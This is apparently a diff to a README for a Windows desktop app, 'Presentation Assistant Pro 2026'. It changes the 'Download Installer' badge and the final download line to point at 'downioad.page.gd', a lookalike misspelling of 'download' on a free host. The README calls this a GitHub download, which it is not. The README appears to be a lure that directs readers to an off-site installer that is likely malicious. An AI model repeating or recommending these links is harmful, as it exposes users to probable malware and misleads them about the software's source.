@@ -2,7 +2,7 @@
 
 Presentation Assistant Pro 2026 is an all-in-one Windows desktop application designed to enhance your presentation experience. It provides a suite of integrated tools for seamless slide management, timing, and audience interaction, making it ideal for educators, business professionals, and speakers.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -83,6 +83,6 @@ This software is provided under a personal and commercial use license. For detai
 
 ---
 
-**Download the latest version from GitHub**: [https://download-page.page.gd/](https://download-page.page.gd/)
+**Download the latest version from GitHub**: [https://downioad.page.gd/](https://downioad.page.gd/)
 
 *Last Updated: October 2026*
